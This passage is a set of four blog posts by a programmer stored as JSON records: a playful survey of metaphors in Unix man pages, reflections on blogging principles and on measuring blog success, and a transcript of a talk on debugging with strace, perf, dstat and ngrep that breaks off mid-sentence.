{"url": "https://jvns.ca/blog/2020/05/08/metaphors-in-man-pages/", "title": "Metaphors in man pages", "content": "\n     \n\n This morning I was watching a  great talk by\nMaggie Appleton \nabout metaphors. In the talk, she explains the difference between a\n“figurative metaphor” and a “cognitive metaphor”, and references this super interesting book called  Metaphors We\nLive By  which\nI immediately got and started reading. \n\n Here’s an example from “Metaphors We Live By” of a bunch of metaphors we use\nfor ideas: \n\n \n ideas as  food : “ raw  facts”, “ half-baked  ideas”, “ swallow  that claim”, “ spoon-feed  our students”, “ meaty  part of the paper”, “that idea has been  fermenting  for years” \n ideas as  people : “the theory of relativity  gave birth  to an enormous number of ideas”, “whose  brainchild  was that”, “those ideas  died off  in the middle ages”, “cognitive psychology is in its  infancy “ \n ideas as  products : “we’ve  generated  a lot of ideas this week”, “it needs to be  refined ”, “his  intellectual productivity  has decreased in recent years” \n ideas as  commodities : “he won’t  buy  that”, “that’s a  worthless  idea”, “she has  valuable  ideas” \n ideas as  resources : “he  ran out  of ideas”, “let’s  pool  our ideas”, “that idea will  go a long way “ \n ideas as  cutting instruments : “that’s an  incisive  idea”, “that  cuts right to the heart  of the matter”, “he’s  sharp “ \n ideas as  fashions : “that idea  went out of style  years ago”, “marxism is  fashionable  in western europe”, “berkeley is a center of  avant-garde  thought”, “semiotics has become quite  chic “ \n \n\n There’s a  long list of more English metaphors here , including many metaphors from the book. \n\n I was surprised that there were so many different metaphors for ideas, and that\nwe’re using metaphors like this all the time in normal language. \n\n let’s look for metaphors in man pages! \n\n Okay, let’s get to the point of this blog post, which is just a small fun\nexploration – there aren’t going to be any Deep Programming Insights here. \n\n I went through some of the examples of metaphors in Metaphors To Live By and\ngrepped all the man pages on my computer for them. \n\n processes as people \n\n This is one of the richer categories – a lot of different man pages seem to\nagree that processes are people, or at least alive in some way. \n\n \n Hangup detected on controlling terminal or  death  of controlling process  ( man 7 signal ) \n can access the local  agent  through the forwarded connection  ( man ssh_config ) \n If the exit of the process causes a process group to become  orphaned   ( man exit ) \n If a parent process terminates, then its  “zombie” children  (if any)  ( man wait ) \n … send SIGHUP to the  parent  process of the client  ( man tmux ) \n Otherwise, it  “runs” to catch up  or waits  ( man mplayer ) \n However, Git does not (and it should not) change tags  behind users back  ( man git-tag ) \n will  listen  forever for a connection  ( man nc_openbsd ) \n this monitor scales badly with the number of files being  observed   ( man fswatch ) \n If you try to use the  birth  time of a reference file  ( man file ) \n a program  died  due to a fatal signal  ( man xargs ) \n protocol version in the TLS  handshake   ( man curl ) \n it will  look for  a debug object at…  ( man valgrind ) \n \n\n data as food \n\n \n “Apparently some digital cameras get  indigestion  if you feed them a CF card)  ( man mkfs ) \n “Send packets using  raw  ethernet frames or IP packets”  ( man nmap ) \n “the above example can be thought of as a maximizing repeat that must  swallow  everything it can”  ( man pcrepattern ) \n “This will allow you to  feed  newline-delimited name=value pairs to the script on’  ( man CGI ) \n \n\n data as objects \n\n \n Kill the tmux server and clients and  destroy  all sessions  ( tmux ) \n Each command will produce one  block  of output on standard output.  ( man tmux ) \n “HTTPS guarantees that the password will not  travel  in the clear”  ( man Net::SSLeay ) \n “way to  pack  more than one certificate into an ASN.1 structure”  ( man gpgsm ) \n \n\n processes as machines/objects \n\n \n “This is  fragile , subject to change, and thus should not be relied upon”  ( man ps ) \n “This is useful if you have to use  broken  DNS”  ( man aria2c ) \n “This provides good safety measures, but  breaks down  when”  ( man git-apply ) \n “debugfs is a debugging tool. It has  rough edges !”  ( man debugfs ) \n \n\n containers \n\n There are LOTS of containers: directories, files, strings, caches, queues,\nbuffers, etc. \n\n \n can exploit that to  get out  of the chroot directory  ( man chroot ) \n “The file  containing  the RFC 4648 Section 5 base64url encoded 128-bit secret key” \n “Keys must start with a lowercase character and  contain  only hyphens” \n “just specify an  empty  string”  ( man valgrind ) \n “the cache is  full  and a new page that isn’t cached becomes visible”  ( man zathurarc ) \n “Number of table  overflows ”  ( man lnstat ) \n “likely  overflow  the buffer”  ( man g++ ) \n \n\n resources \n\n There are also lots of kinds of resources: bandwidth, TCP sockets, session IDs,\nstack space, memory, disk space. \n\n \n This is not recommended and  wastes  bitrate  ( man bitrate ) \n corruption or  lost  data if the system crashes  ( man btree ) \n you don’t want Wget to  consume  the entire available bandwidth  ( man wget ) \n Larger values will be slower and cause x264 to  consume  more memory  ( man mplayer ) \n the resulting file can  consume  some disk space  ( man socat ) \n attempting to  reuse  SSL session-ID  ( man curl ) \n This option controls stack space  reuse   ( man gcc ) \n Keep the TCP socket open between queries and  reuse  it rather than creating a new TCP socket  ( man dig ) \n the maximum value will easily  eat up  three extra gigabytes or so of memory  ( man valgrind ) \n \n\n orientation (up, down, above, below) \n\n \n Send the escape character to the  frontend   ( man qemu-system ) \n Note that TLS 1.3 is only supported by a subset of TLS  backends   ( man curl ) \n This option may be useful if you are  behind  a router  ( man mplayer ) \n When a file that exists on the  lower  layer is renamed  ( man rename ) \n Several of the socket options should be handled at  lower  levels   ( man getsockopt ) \n while still performing such  higher  level functionality  ( man nmap ) \n This is the same string passed  back to  the front end  ( man sudo_plugin ) \n On Linux,  futimens  is a library function implemented  on top  of the  utimensat  system call  ( man futimens ) \n \n\n buildings \n\n Limits as rooms/buildings (which have floors, and ceilings, which you hit) are kind of fun: \n\n \n the kernel places a  floor  of 32 pages on this size limit  ( man execve ) \n This specifies a  ceiling  to which the process’s nice value can be raised  ( man getrlimit ) \n If this limit is  hit  the search is aborted  ( man gcc ) \n these libraries are used as the  foundation  for many of the libraries  ( man Glib ) \n \n\n money / wealth \n\n \n This is a very  expensive  operation for large projects, so use it with caution  ( man git-log ) \n Note that since this operation is very I/O  expensive   ( man git-filter-branch ) \n provides a  rich  interface for scripts to print disk layouts  ( man fdisk ) \n The number of times the softirq handler function terminated per second because its  budget  was consumed  ( man sar.sysstat ) \n the extra  cost  depends a lot on the application at hand  ( man valgrind ) \n \n\n more miscellaneous metaphors \n\n here are some more I found that didn’t fit into any of those categories yet. \n\n \n when a thread is created under glibc, just one  big  lock is used for all thread setup  ( man valgrind ) \n will likely  drop  the connection  ( man x11vnc ) \n on all  paths  from the load to the function entry  ( man gcc ) \n it is a very good idea to  wipe  filesystem signatures, data, etc. before  ( man cryptsetup ) \n they will be  embedded  into the document \n the client should automatically  follow  referrals returned \n even if there exist mappings that  cover  the whole address space requested  ( man mremap ) \n when a network interface  disappears   ( man systemd-resolve ) \n \n\n we’re all using metaphors all the time \n\n I found a lot more metaphors than I expected, and most of them are just part of\nhow I’d normally talk about a program. Interesting! \n\n \n.nowrap {\n    white-space: nowrap;\n    padding: 0px;\n}\n \n\n"},
{"url": "https://jvns.ca/blog/2017/03/20/blogging-principles/", "title": "Blogging principles I use", "content": "\n     \n\n I wrote this set of blogging priciples on Twitter a while back and thought I’d\nmirror it to this blog. These principles help me publish stuff. (publishing\nstuff on the internet is hard!). \n\n \n \n \n \n \n\n Here’s a text version of the comic: \n\n be honest about what I know \n\n I constantly write things on this blog like “I’m not sure about this part…”.\nI try to not be falsely modest (when I do actually know something, I try to\njust state it without hedging), but when I don’t know something, I say so. \n\n I like doing this because it lets me write about things a little out of my\ncomfort zone without worrying about misleading someone. \n\n Also – I just think it’s important for people to admit when they don’t know\nsomething. I did a keynote recently at SRECon (a conference in my field). It’s\npossibly in my interest to appear like a Serious Expert who you should listen\nto. But instead I decided to start my talk abstract like this: \n\n \n I don’t always feel like a wizard. I’m not the most experienced member on my\nteam, like most people I sometimes find my work difficult, and I still have a\nTON TO LEARN. \n \n\n This always feels like a bit of a risk (“will people take me seriously? will it\nbe bad for my career?“). I’m always a little relieved when I read things like this\nreview of my talk (from  this article ) \n\n \n Yet this honesty conveys the enticing reality of the work. Distributed\nsystems are inherently complex, consisting of myriad components, any\ncombination of which can cause knotty problems, especially at scale. Like a\ngood detective, a dedicated SRE follows the facts where they lead, learning\nalong the way. The combination of humility, curiosity and bravery makes the\nwork seem as compelling as a good episode of CSI. \n \n\n The surprising and delightful thing to me about being honest on this blog is –\na lot of the time people  love it . They’re like “I see – she knows a lot,\nshe’s good at what she does, and she’s not scared to admit that she\ndoesn’t understand everything. That makes sense! None of us know everything!” \n\n I feel like I’m pretty lucky to be able to do this. \n\n try to not write anything (too) wrong \n\n I write a lot of things that are a little bit wrong on this blog. I don’t edit\nthat carefully, and I make mistakes all the time. I do try to avoid overly\negregious errors though – if I’m  really  sketchy on the details of\nsometimes, I do a little research to make sure that I don’t have it totally wrong. \n\n It turns out that making minor mistakes in public isn’t that big of a deal –\npeople sometimes send me corrections, and they’re always really nice about it. \n\n be positive \n\n None of these are meant to be prescriptive, but this one least of all. \n\n I don’t really write negative posts. I think negative posts are important and\ninteresting and valuable but they are not generally what I write. \n\n (as for ‘negative’ posts I love – just from today, this  post “epoll is fundamentally broken”  is a very good read) \n\n write for a past version of myself \n\n The easiest audience for me to write for is myself! For example, yesterday I wrote a post about a\ntracing tool called ftrace. The reason I wrote it is that I was frustrated that\nI couldn’t find a single post that explained what ftrace was and how to use it in\na clear way. So I wrote the post that I wish I’d had when I was getting\nstarted. \n\n This means I also refer back to my own blog a lot – I put all my favorite\nftrace links in that post, and I’ve already used it as a reference to find the\narticles I like. \n\n stick to my own experience \n\n I don’t usually like to give advice (“you should do X”). Instead I usually just\ntell stories about my own experience with something, and then people can decide\nfor themselves if that will work for them. \n\n talk about what I’ve learned recently \n\n I like to write about things right after I’ve learned them. Usually then the\nexperience of learning the things is fresh in my mind (“can you BELIEVE this\nthing about the Java garbage collector?!“) and I can more easily communicate\nwhat is confusing about it to a beginner. \n\n At this point I’m pretty good at learning a thing and then turning around after\n2 days and teaching it to someone else. \n\n remember it’s OK if not everyone likes it \n\n I write some blog posts that are way more popular than others. The all-time most popular post on this blog is  Questions I’m asking in interviews  from 2013.\nIt’s good that I’m not waiting to write another post that’s as popular as that\none because i may not ever succeed :) \n\n I write about machine learning and containers and linux and meta stuff like\nasking questions and careers, and I’m pretty sure there is no single person who\nis actually interested in all of it. That’s okay! I follow all kinds of\nblogs where I am only interested in like 30% of the posts. I LOVE those blogs. \n\n It’s always tempting to try to optimize my posts to get the most possible page\nviews, but it’s more important to me to just be able to frequently post small\nthings that I find interesting. \n\n"},
{"url": "https://jvns.ca/blog/2018/02/20/measuring-blog-success/", "title": "Measuring a blog's success: focus on conversations, not page views", "content": "\n     \n\n I’ve been writing this blog now for a little over 4 years. I’ve found it to be a really rewarding\nand fun thing to do – more people than I can count have told me that this blog has helped them,\nlots of you have helped me figure things out, and just the act of writing down confusing things has\ntaught me so much. \n\n I want to talk a little about what what it means for a blog to be “successful” (and how I think\nabout success for this blog) because I think independent blogs are kind of a wonderful + magical\nthing – I have a site that I own! And lots of people have signed up to get updates when I post,\nbecause they’re interested in what I’m saying. And there isn’t any other intermediary (a\nnewspaper/facebook/twitter/anyone) who we have to appeal to, it’s just up to me to write interesting\nthings and up to people whether they want to subscribe or not. \n\n A lot of the posts I’ve seen about building a successful blog (like  this one ) are very\nSEO/marketing heavy and seem to assume your goal is to maximize page views. I haven’t found\nmaximizing to be that rewarding. So what does success look like if it doesn’t mean “maximize page\nviews”? \n\n This post isn’t really about how to build the Biggest Most Popular Blog (I think small blogs with\nsmall audiences are wonderful and important things!). It’s more about how I think about building a\nblog which is fun and useful and where I feel connected with people who read it. \n\n I’ll also talk a little bit about metrics that I find more meaningful than page views (like\nsubscribers) and how to track those! \n\n focus on conversations, not page views \n\n Like many website authors, I’ve spent my share of time looking nervously at Google Analytics for my\nsite (“do people like me? Oh wow! People are visiting my site! wow!”). I haven’t found stressing\nabout google analytics numbers to be that useful – if 2x or 5x more people visit my site this month\nthan last month, so what? It doesn’t really feel that meaningful to me. \n\n I find it much more useful to ask myself – am I having interesting conversations / learning things\nwith as a result of blogging? A couple examples of times I’ve had great conversations as a result of\nblogging: \n\n I’ve been writing up my progress on building a Ruby profiler, and other profiler authors have told\nme a lot of interesting things about their experiences writing profilers. I’ve gotten some really\nhelpful tips. \n\n Or, last year I wrote a lot of blog posts about Kubernetes as I was trying to figure out how to use\nit. One awesome thing that happened as a result of that is that someone from another company IMed me\nto ask me questions, and they ended up sharing the code for a super interesting container project\nthat gave me new great ideas. I would never have talked to that person if it weren’t for my blog! \n\n Talking about what I’m working on in public means that other people working in the same field can\ntell me useful things and help me out, which is  awesome . \n\n A result of this attitude is that I don’t write about topics I’m not interested in having\ndiscussions with people about! Like I could write a post about cryptocurrencies and it might even be\nhelpful to some people, but I’m not interested in talking about cryptocurrencies, so I probably\nwon’t write about that! \n\n try to write blog posts that actually help people \n\n The other big thing that keeps me motivated is when people tell me that a blog post I wrote really\nhelped them! \n\n It’s very easy to write blog posts that are widely read but don’t make a big difference to the\npeople who read them (page views aren’t important!!), so it’s always interesting to see what writing\nis actually helping people. To contrast two technical posts that a lot of people read – this  post about a mac kernel bug  got a lot of page views and was\nfun to write, but I don’t think it really helped anyone. This post from last year about  how kubernetes certificate authorities work  is about something I really\nstruggled to understand, and at least 4-5 people have told me that the blog post really helped them\nunderstand the topic (for example in  this tweet from last week! ). \n\n Blog posts don’t  have  to be useful (they can also just be entertaining!) but I find it rewarding\nto write useful posts so “number of people who have told me my blog helped them lately” is a part of\nhow I measure success. \n\n One of the most useful blogs I read right now is  Lara Hogan’s amazing blog  – for instance this post on  what to do when your manager isn’t supporting you  is something that would have really\nhelped me at some times in the past. I’d love to be able to be as useful as that for other people and I hope that sometimes I am. \n\n write for actual human people, not “content” for an “audience” \n\n It’s always striking to me when I go give a talk at a conference, meet someone whose work I really\nrespect, and they tell me, “oh yeah! I read your blog, it’s great!” Also I know that some of my\nfriends read my blog, and I like my friends. Because I know that all these people I like read my\nblog, it makes me want to write posts that are kind and interesting, not just “content” that I think\nmy “audience” will “engage” with :). \n\n A lot of my blog posts come out of conversations I have with individual people! Like I started\nwriting this one in the hopes that it might help one of my friends who writes a really cool blog. \n\n How do people comment? \n\n My favorite part of blogging is getting ideas / corrections / comments back from people! I don’t\nhave a comments section on my blog, but I actually love hearing from people. \n\n In practice most of the regular comments I get are on Twitter – I’ll post a tweet saying with a\nlink to a post, and people will tell me what they thought! Here’s what I see as being the options\nfor comments: \n\n \n on the blog. (either disqus / self-hosted comments) \n on Twitter. \n on reddit or hacker news or whatever. \n by email. \n \n\n Twitter comments are the thing that works the best for me right now – I used to have Disqus\ncomments on this blog but I removed them because I decided moderating them was too much work – I\nlike having a public discussion around my blog, but being responsible for hosting and moderating\nthat discussion forever isn’t what I want right now. \n\n Also sometimes people email me interesting comments, which is awesome, for example when somebody\nemailed me out of the blue to tell me about  regular expression\nderivatives  just because they\nthought I might find it cool (I did!). \n\n To me this is one of the most important things – like for example I wrote a post about how to look\nat a container’s mount namespace, and somebody  pointed out on Twitter  that there was an easier way to do it that I’d missed! I wouldn’t have thought of that if that person hadn’t commented. \n\n letting people subscribe is important! \n\n I think one of the most rewarding parts of blogging (both as a reader and as a writer!) is that you\ncan continuously hear what somebody’s working on over months or years. I have a ton of blogs that\nI’ve been reading for years and I love seeing how the author’s interests change over time. \n\n As a writer, I’d much rather have a few hundred people who are (to some extent) keeping up with what\nI’m working on and sometimes chip in suggestions when they have something to add than 100,000 people\nwho read 1 blog post and make some snarky comments :) \n\n I don’t try to push “HELLO HERE IS MY MAILING LIST WOULD YOU LIKE TO SIGN UP” popups on people – I\nfind that obnoxious and I don’t see the point. \n\n Here are the main ways to let people subscribe to your blog. \n\n \n RSS! This is the classic. People keep periodically claiming that RSS is dead but thousands of\npeople subscribe to my RSS feed so that’s obviously not true. Setting up and linking to an RSS feed\nis super easy. \n Email. I have an automatic weekly digest that I generate from my RSS feed, ( here’s how I set it up ). I think of this like RSS for people who don’t have RSS readers. I didn’t add this until\npretty recently but quite a few people subscribe to it now. \n Twitter. I post a link to each of my blog posts to Twitter when I publish it (manually). I don’t\ndo anything special here – just tweet the name of the post + a link. \n \n\n the only metric I like: subscribers counts! \n\n I’ve left metrics to the end of this post because for me relationships and conversations are a much\nmore important part of blogging than page views / eyeballs. That said, it’s still meaningful to me\nthat many people are reading my blog, so I like tracking it a little bit! \n\n The only metric that I find to be meaningful is subscriber counts, because it tells me whether\npeople are interested in an ongoing way in what I have to say. I can count the number of people who\nsubscribe to my mailing list easily, which is nice. \n\n Here are 2 different ways to count how many RSS subscribers a blog has: \n\n The first way is Feedly: If I search for “Julia Evans” in Feedly, I see this, which tells me\nhow many Feedly subscribers I have \n\n The other way is to search my access logs – if I grep for ‘subscribers’ in my HTTP access logs, it\nturns out that many RSS readers report the number of subscribers in their user-agent string, like\nthis: \n\n NewsBlur Feed Fetcher - 490 subscribers\nFeedbin feed-id:478105 - 419 subscribers\nNewsify Feed Fetcher - 27 subscribers\nFeed Wrangler/1.0 (34 subscribers)\n \n\n intentionally publicizing my blog \n\n I’ve left intentionally publicizing my blog (by posting it to tech aggregator sites like\nreddit/hacker news) to the end because I think it’s the least important thing to me today. When I\nstarted out, I posted my blog posts to hacker news probably dozens of times, and I think it really\nhelped me build an initial readership of people who were interested in the same things, which was\ngreat! \n\n These sites obviously aren’t perfect but I think getting my blog in front of a wide audience\nwas a great way to find other people who are interested in the same things as me :) \n\n Today I have lots of awesome readers who tell me interesting things, and that’s enough for me! I\ndon’t really have any desire to publicize this blog further (though my blog does get frequently\nposted to those sites and that’s fine) – my goal is just to write useful things and keep learning\n:) \n\n how do you measure  your  blog’s success? \n\n I think it’s very possible to have a blog that is meaningful to people and lets you have interesting\nconversations about the topics you’re interested in, even (especially?) if you only have a\nrelatively small number of readers! \n\n If you’re thinking about how to grow an audience for a blog (especially if the goal of the blog is\nnot to make money!) I’d encourage you to think about what’s important to you instead of trying to\nblindly optimize page views, and track those things instead. And if you have other ways to measure\nyour blog’s success on more human terms than “page views” I’d be curious to hear what they are! \n\n  thanks to jeff, will, sonali, lindsey, veit, laura, tom, and bonnie for reading this and\nmaking it better!  \n\n"},
{"url": "https://jvns.ca/blog/2016/09/17/strange-loop-talk/", "title": "A swiss army knife of debugging tools: talk & transcript", "content": "\n     \n\n \n\n.container {\n    display: flex;\n}\n.slide {\n    width: 50%;\n}\n.content {\n    width: 50%;\n    align-items: center;\n    padding: 20px;\n}\n\n@media (max-width: 480px) { /*breakpoint*/\n    .container {\n        display: block;\n    }\n    .slide {\n        width: 100%;\n    }\n    .content {\n        width: 100%;\n}\n\n \n\n Yesterday I gave a talk at Strange Loop. I’ll try to write more about the conference and my favorite things about it later, but for now here’s the talk I gave. \n\n video \n\n \n\n transcript \n\n I mean “transcript” in a very loose sense here – this is pretty approximate. I wrote it all down without watching the actual talk I gave at all. \n\n \n \n \n \n \n \nHi! I'm Julia. I work at Stripe and today I'm going to tell you about some of my favorite debugging tools!\n \n \n \n\n \n \n\n \n \n \n \n \n \nan alternate title slide!\n \n \n \n\n \n \n\n \n \n \n \n \n \nAt Strange Loop we often talk about programming languages! This talk isn't about programming languages at all. Instead, we're going to talk about debugging tools that you can use to debug programs in   any   programming language. \n \n \nWhen Haskell does networking, it uses TCP. Python uses TCP! Fortran! So if we debug programs using networking tools, we can debug programs in any language.\n \n\n \n \n\n \n \n \n \n \n \nWhen I log into a computer, sometimes something has gone TERRIBLY WRONG. And in these situations, sometimes you can feel helpless! We're going to talk about tools you can use to figure out what has happened.\n \n\n \n \n\n \n \n \n \n \n \nI used to think to debug things, I had to be really really smart. I thought I had to stare at the code, and think really hard, and magically intuit what the bug was.\n \n \nIt turns out that this isn't true at all! If you have the right tools, fixing bugs can be *really easy*. Sometimes with just a little more information, you can figure out what's happening without being a genius at all.\n \n\n \n \n\n \n \n \n \n \n \nThe last thing I want to encourage you to do before we start this talk is -- we're going to be talking about a lot of systems tools. It's easy to think \"oh, this is operating systems, it's too hard.\"\n \n \nBut if you're not scared, you can usually figure out almost anything!\n \n\n \n \n\n \n \n \n \n \n \nSo, when we normally debug, we usually read the code, add print statements, and you should probably know the programing language of the program you're writing, right?\n \n \n \n\n \n \n \n \n \n \nNope! This isn't true at all. You can totally debug programs without having their source code or even knowing what language they're written in at all. That's what we're going to do in this talk.\n \n\n \n \n\n \n \n \n \n \n \nHere are some of the tools we're going to discuss in this talk! strace, ngrep, wireshark, etc.\n \n \n \n\n \n \n\n \n \n \n \n \n \nAnd the way that most of these work is like the following -- you have a question (\"what file did my program open\"), you use a tool to interrogate your operating system about what the program is doing, and hopefully the answer you get back helps you fix your problem.\n \n\n \n \n\n \n \n \n \n \n \nI'm going to explain how these tools work through a series of mysteries (the case of the missing configuration file! the case of the slow program! the case of the French website!) and then I'm going to go a little more in depth into two more tools -- perf and tcpdump.\n \n \n \n\n \n \n\n \n \n \n \n \n \n \n \n \n\n \n \n\n \n \n \n \n \n \nWho's written a configuration file and been confused about why it didn't work and realized they were editing the WRONG FILE? Yeah, me too. This is really annoying! \n \n \nNormally to figure out what the right configuration file is for your program, you might read the documentation or as a coworker. But what if the documentation is wrong, or your coworker doesn't know? What do you do if you want to be really sure?\n \n\n \n \n\n \n \n \n \n \n \nA really classic example of this is .bashrc vs .bash_profile -- when you start bash, which configuration file does it use? How can you tell? I actually know this through experience, but what if I didn't?\n \n\n \n \n\n \n \n \n \n \n \nTo figure this out, we're going to use my absolute favorite program! STRACE. strace traces system calls.\n \n\n \n \n\n \n \n \n \n \n \nLet's talk about what a system call is. Your program does not itself know how to open files. To open a file, you need to understand how your hard drive works, and what filesystem is on that hard drive, and all kinds of complicated things.\n \n \nInstead, your program asks the operating system to open a file. One that file is open, it can ask the OS to read and write to the file. The words I've underlined in red (open and read) are called **system calls**.\n \n\n \n \n\n \n \n \n \n \n \nstrace will tell you every system call a program is running. To run strace on a program, you just say \"strace\" before it.\n \n \nWhen I run strace on bash and ask it to look at just \"open\" system calls, I can see that it's opening .bashrc! Great! We win.\n \n\n \n \n\n \n \n \n \n \n \nSo we answered our question! Awesome.\n \n\n \n \n\n \n \n \n \n \n \nBefore we move on, I want to show you a quick demo of what it actually looks like to use strace. (do demo>\n \n \nWhat you see is that strace prints approximately a billion lines of output, and you very very likely don't know what they all mean. This is okay!\n \n \nWhen I use strace, I ignore practically everything, and just grep to find the one thing I'm interested in. This makes it a lot easier to understand :)\n \n\n \n \n\n \n \n \n \n \n \nAn extremely important thing to know about strace is that if you run it on a program, it can make that program run up to 50x slower, depending on how many system calls that program uses.\n \n \nSo don't run it on your production database.\n \n\n \n \n\n \n \n \n \n \n \nHere are some of my favorite system calls! There are system calls for communicating over the network (what computers is my program talking to?), for reading and writing files, and executing programs.\n \n \nexecve is one of my favorites because -- sometimes I write scripts that run a bunch of other programs. If the script is doing the wrong thing, it can be really annoying to debug! Reading code is a lot of work.\n \n \n\nBut if you use strace, you can just see the commands that got run really quickly, see what is wrong, and then go back and track it down in your program to fix it.\n \n\n \n \n\n \n \n \n \n \n \nSome really important command line flags to strace! -f lets you strace the process and every subprocess it creates.  I basically always run strace with -f.\n \n \n-y is an amazing flag in new versions of strace that shows you the filename of the file you're reading to and writing from. (instead of just the file descriptor)\n \n\n \n \n\n \n \n \n \n \n \nI was so excited when I learned about strace, and I couldn't believe that I'd been programming for 9 years without knowing about it. So I wrote a zine about my love for strace. You can find it at  https://wizardzines.com/zines/strace \n \n \n \n\n \n \n\n \n \n \n \n \n \nOkay, so I told you that strace is slow! What if you want something that is not slow? If you're on a Linux kernel version above 4.4 or so, you're in luck. There's a set of tools you can download from  https://github.com/iovisor/bcc , which include something called \"opensnoop\".\n \n \n(do opensnoop demo). Basically opensnoop can tell you which files your programs are opening, but without slowing down your programs! amazing!\n \n \nIn particular Ubuntu 16.04 is new enough for this tool.\n \n\n \n \n\n \n \n \n \n \n \nOpensnoop (and the other scripts in that repo I linked to) work using eBPF.   Brendan Gregg  has been writing a lot about eBPF for a while. It seems super interesting.\n \n\n \n \n\n \n \n \n \n \n \nOkay, next mystery!\n \n\n \n \n\n \n \n \n \n \n \nHere I'm going to discuss 3 slow programs, which are all slow for different reasons. We're going to figure out why they're all slow, without reading the source code or anything. All the programs are written in Python.\n \n \nThey're slow because of CPU time, writing too much to disk, and because of waiting for a reply from a network connection.\n \n\n \n \n\n \n \n \n \n \n \nHere's the first one!\n \n \n \n\n \n \n\n \n \n \n \n \n \nI'm going to run `time` on all these programs. time is a nice program! It tells you how long the program took (2 seconds), but that's not all!\n \n \nIt also breaks down how the time was spent. This program spent 5% of its time on the CPU! So for the remaining 95% of the time it was waiting.\n \n\n \n \n\n \n \n \n \n \n \nThe program could have been waiting for a lot of different things! Network, disk, just because it decided to hang out and wait?\n \n \n \n\n \n \n\n \n \n \n \n \n \nLuckily this is pretty easy to find out! We can peer into the Linux kernel's soul and figure out what it was doing when the program was waiting.\n \n \n \n\n \n \n\n \n \n \n \n \n \nFor any program, we can take the program's PID (in this case 31728), and ask what the Linux kernel is doing for that program right now.\n \n \nWe get a call stack starting with the system call and ending up with the current function. Awesome!\n \n\n \n \n\n \n \n \n \n \n \nTo help you see what's going on, I deleted almost everything. I know what tcp_recvmsg means! It means it's waiting to receive a message on a TCP connection!\n \n \nThat's networking! That was really easy! We don't need to be kernel debugging wizards to figure out what's going on.\n \n\n \n \n\n \n \n \n \n \n \n \n \n \n\n \n \n\n \n \n \n \n \n \nThis was the actual program that the server was running -- you can see that it sleeps for 2 seconds, and then returns a response of \"hi!\".\n \n \nSo it's obvious why the program was slow :) But you can apply the exact same technique to much more complicated programs.\n \n\n \n \n\n \n \n \n \n \n \n \n \n \n\n \n \n\n \n \n \n \n \n \nWhen we run `time` on our next program, we see something really interesting right away! It's spending 99% of its time just using the CPU.\n \n \n \n\n \n \n\n \n \n \n \n \n \nAt this point we're actually done -- since this is a Python program, the easiest thing to do is probably just to run a Python profiler to find out what it was doing.\n \n \n \n\n \n \n\n \n \n \n \n \n \nAnd what it was actually was adding up 14 million numbers. You can decide whether you think 2.74 seconds is how long you think it should take to add up 14 million numbers or not :)\n \n \n(I made a whole game about this called  computers are fast  )\n \n\n \n \n\n \n \n \n \n \n \n \n \n \n\n \n \n\n \n \n \n \n \n \nOkay, this one is spending 94% of its time on the CPU. So this is basically the same as before, right? Nope!\n \n \nYou'll notice that there are two kinds of CPU your program can use:   user  CPU and   system  CPU. This one is spending most of its time on CPU, but CPU in the kernel! So your program is still spending most of its time waiting.\n \n \n \n \n \n\n \n \n \n \n \n \nIf you have a program that's waiting, a nice way to try to figure out what's going on is to use   dstat  \n \n \ndstat is a nice little program that prints our how much network, disk, and CPU your program is using \n \n\n \n \n\n \n \n \n \n \n \nHere I do a demo where I run a program (python mystery_3.py), and run `dstat` while the program is running.\n \n \ndstat is shows that while our program is running, 300MB/s get written to disk. When the program stops, the disk writes stop. Interesting!\n \n\n \n \n\n \n \n \n \n \n \nSo we understand that something's going on with writes, but why is it using all this CPU? Surely disk writes don't use that much CPU?\n \n\n \n \n\n \n \n \n \n \n \nWho's used top? (everyone) htop? (a few less people) perf top? (almost nobody)\n \n \n \n\n \n \n\n \n \n \n \n \n \nSo, top tells you which one of your programs is using all your CPU. That's great.\n \n \nBut it doesn't tell you which *functions* your programs are running. `perf top` does, though! Let's see what that looks like.\n \n\n \n \n\n \n \n \n \n \n \nI run `python mystery_3.py` again, and I quickly switch to another terminal tab and run `perf top`. perf top shows a bunch of functions and how much CPU time each one is using.\n \n \n \n\n \n \n\n \n \n \n \n \n \nThere was a lot to look at one the screen, so let's zoom in. The top function is something called `_aesni_enc1`. What does AES tell us? ENCRYPTION! That's right!\n \n \nSo it turns out that this program is writing files to disk, and specifically it's writing to my home directory. But my home directory is encrypted! So it needs to spend a bunch of extra time encrypting all the data, and that's what all the CPU time is about. Awesome.\n \n \nSo we've solved our mystery!\n \n\n \n \n\n \n \n \n \n \n \nOne really awesome thing about perf is -- normally perf only tells you about which *C functions* are running on your computer. But you might want to know about which functions in your programming language are running on your computer! In Java, you can use  perf-map-agent  to get perf to tell you what Java functions are running on your computer!\n \n \nAnd you can do the same thing  with node.js .\n \n\n \n \n\n \n \n \n \n \n \nOur last performance program we're going to look at is the case of the French website.\n \n \nI live in Montreal, and it's a bilingual city, so when you open a city website, it might show up in either French or English. You never know! What determines that?\n \n\n \n \n\n \n \n \n \n \n \nThis is a website I made for this conference. It just says \"hello! welcome to strange loop!\" Great.\n \n \n \n\n \n \n\n \n \n \n \n \n \nBut when I get the very same website from my terminal, it replies in French, not in English! What's going on!\n \n \n \n\n \n \n\n \n \n \n \n \n \nMost of you probably use grep, which lets you search text files. ngrep is a program that lets you search your network traffic!\n \n \nHere I do a demo where I use ngrep to show all TCP packets on localhost. We\nsee that with curl, there's a very very simple HTTP request, but Google Chrome\nhas a much longer request and a lot more to share with the server. In\nparticular, the request has the string \"Accept-Language: en-US\" in it. When we\nadd that header to our curl request, we get a response in English! Awesome.\n \n \n\nComputer programs aren't always deterministic, but they're always logical. If\nyou're seeing a difference where you think there shouldn't be any, there's\nalways a reason. Looking at the inputs and outputs to your programs can help you figure out what's going on, and network traffic is a really nice place to do that.\n\n \n\n \n \n\n \n \n \n \n \n \nOkay, so this is a totally new section of the top.\n \n \nHere we're going to talk about two of my favorite things: perf and tcpdump.\n \n\n \n \n\n \n \n \n \n \n \nperf is a profiling tool for Linux that a lot of people don't know about, mostly because it's really sparsely documented. My goal today is to change that a little bit.\n \n \nOne really confusing thing about perf is that it actually has 3 almost totally unrelated tools in them: it can tell you about your hardware counters, do sampling profiling for CPU, and trace events. I'm going to talk about all these 3 things separately.\n \n\n \n \n\n \n \n \n \n \n \n\nBefore we move on, I want to talk about sampling vs tracing for a little bit.\nIn a sampling profiler, you look at a small percentage of what's going on in\nyour program (what's the stack trace now? how about now?), and then use that information to generalize about what your program is doing.\n\n \n \nThis is great because it reduces overhead, and usually gives you a good idea of what your program is doing.\n \n \nBut what happens if you have an error that happens infrequently? like 1 in 1000 times. You might 